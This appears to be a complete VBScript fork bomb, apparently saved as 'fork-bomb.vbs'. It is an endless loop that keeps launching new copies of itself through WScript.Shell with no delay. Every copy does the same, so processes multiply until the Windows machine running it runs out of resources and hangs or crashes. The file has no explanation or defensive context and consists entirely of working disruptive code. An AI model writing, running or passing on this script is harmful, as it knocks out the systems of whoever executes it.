Do
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run "fork-bomb.vbs"
    
    WScript.Sleep 0
Loop
